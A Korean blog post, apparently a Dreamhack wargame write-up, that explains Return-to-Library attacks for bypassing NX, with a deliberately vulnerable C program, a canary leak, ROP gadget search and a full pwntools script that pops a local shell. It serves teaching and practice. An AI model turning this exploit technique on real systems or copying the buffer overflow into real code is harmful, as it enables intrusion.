---
layout: post
title: Dreamhack | RTL
subtitle: Return to Library
categories: Pwnable
tags: [Theory, Pentest, Pwnable]
---

**본 내용은 Dreamhack을 통해 보실 수 있습니다.**

## RTL

RTL(Return To Library)는 공유 라이브러리에 있는 함수의 주소를 이용해서 바이너리에 존재하지 않는 함수를 이용할 수 있다.

주로 DEP 메모리 보호기법 및 NX bit 활성화시 우회하기 위해서 사용한다. 프로세스에 실행 권한이 있는 메모리 영역은 **바이너리 코드 영역**과 바이너리가 참조하는 **라이브러리의 코드 영역**이기 때문에 우회가 가능하다.

> 즉, Return Address를 라이브러리 내에 존재하는 함수의 주소로 바꿔 NX bit를 우회하는 공격이다.

### 실습 문제

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191028059-9b4e5f6b-5dc6-4de9-9821-d6e5709ee024.jpg" width = 450>
</p>

Canary가 존재하며 NX bit가 활성화되어 있다. Canary Leak과 RTL를 활용하는 문제이다.

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
const char* binsh = "/bin/sh";
int main() {
  char buf[0x30];
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  return 0;
}
```

* Leak Canary : `read(0, buf, 0x100);`를 통해 기존 buf의 크기를 뛰어 넘는 메모리 값을 알 수 있다. 이것으로 Canary leak을 진행할 수 있다.

* Overwrite Return Address : 위와 마찬가지로 `read(0, buf, 0x100);`를 통해 RET를 번경하고 이후 추가 코드도 작성이 가능할 것으로 보인다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191029666-1f98e99b-ca23-46e4-8e8d-c7474370816e.jpg" width = 450>
</p>

총 0x40(64byte)를 할당하고 `read()`함수를 통해 64byte를 넘는 0x100(256byte)를 읽어올 수 있음을 disassemble을 통해 알 수 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191034495-a2303f1c-92da-4816-99c4-ff65625907e1.jpg" width = 450>
</p>

`p system`을 통해서 **system의 plt 주소**를 알 수 있고, `search /bin/sh`로 해당 문자열의 주소까지 알 수 있다. 그렇다면 **system("/bin/sh")**이 가능하다. system()의 인자를 넘기기 위해 해당 문자열 주소를 rdi값으로 설정하면 된다. 이를 위해서 리턴 가젯을 이용한다.

#### 가젯

**ROP(Return Oriented Programming)**기법에서 자주 등장하여 **ret**라는 명령어로 끝나는 명령 조각들을 **가젯**이라 한다. `pop rdi; ret;`혹은 `pop rdi; pop rsi; pop rdx; ret;` 이러한 형태를 띄고 있는 것을 가젯이라 한다.

* **pop rdi; ret;** : 호출할 함수의 인자가 하나일 경우
* **pop rdi; pop rsi; ret;** : 호출할 함수의 인자가 두 개일 경우
* **pop rdi; pop rsi; pop rdx; ret;** : 호출할 함수의 인자가 세 개일 경우

```bash
ROPgadget --binary 파일명 --re "pop rdi"
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191034313-b24b527c-0e15-4104-b59c-0b11002b2b73.jpg" width = 450>
</p>

다시 본론으로 돌아가 우리는 기존에 존재하는 RET를 덮어 다음 값으로 덮어 씌우며 이후의 메모리로 system함수를 사용할 것이다.

> **Buf(56byte) + Canary(8byte) + SFP(8byte) + pop rdi; ret;(8byte) + /bin/sh(8byte) + system plt(8byte)**

이렇게 하면 끝날 것으로 생각했지만 아래와 같은 에러로 종료가 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191036407-b3850de6-74cb-49cb-b95c-4a96bbd02a04.jpg">
</p>

이유는 system 함수로 **rip**가 이동할 때 스택은 반드시 0x10(16byte)로 정렬되어 있어야 한다. 이는 system 함수 내부의 **movaps** 명령어 때문이라고 한다. (자세한 이유는 아직 확인하지 못했습니다.) 그렇기에 아무 의미가 없는 가젯 No-gadget를 추가하면 된다고 합니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191043143-75ac2398-aa2a-4c54-ba44-c53e5eb90a15.jpg" width = 350>
</p>

최종적으로 그려지는 스택의 모습이라 볼 수 있습니다. 이래도 스크립트를 작성해보겠습니다.

```python
from pwn import *
p = process("./rtl")
e = ELF("./rtl")
def slog(name, addr): return success(": ".join([name, hex(addr)]))
# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
SFP = b'S' * 8
system_plt = e.plt["system"]
binsh = 0x402004
pop_rdi = 0x0000000000401333
ret = 0x000000000040101a

payload = b"A" * 56 + p64(cnry) + SFP
payload += p64(ret)  # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
pause()

p.sendafter("Buf: ", payload)
p.interactive()
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/191042063-dfde4334-f85a-44d0-b693-6debf0056573.jpg" width = 350>
</p>

